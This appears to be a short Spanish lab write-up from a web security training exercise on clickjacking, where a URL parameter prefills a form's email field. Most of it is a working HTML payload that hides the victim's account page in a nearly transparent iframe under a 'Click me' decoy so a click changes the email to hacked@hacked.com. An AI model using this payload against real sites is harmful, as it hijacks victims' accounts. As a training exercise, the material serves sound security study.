# Clickjacking con datos precargados por parámetro 

Tags: #Clickjacking #BurpSuite 

```bash 
Este lab profundiza en la técnica de clickjacking permitiendo que el atacante modifique los datos del formulario a través de parámetros en la URL. En este caso, el objetivo es engañar al usuario para que pulse sobre el botón de actualizar correo electrónico, el cual ha sido rellenado automáticamente con una dirección maliciosa pasada por parámetro.


Notas:
	1. Este lab solo funciona con Edge 
```

```html 
# Se busca cambiar el correo de la víctima 

<style>
iframe{
width: 500px;
height: 600px;
opacity: 0.001;       
}

div{
position: absolute;
top: 450px;
left: 100px;
}
</style>

<div>Click me</div>
<iframe src="https://web.com/my-account?email=hacked@hacked.com"></iframe>
```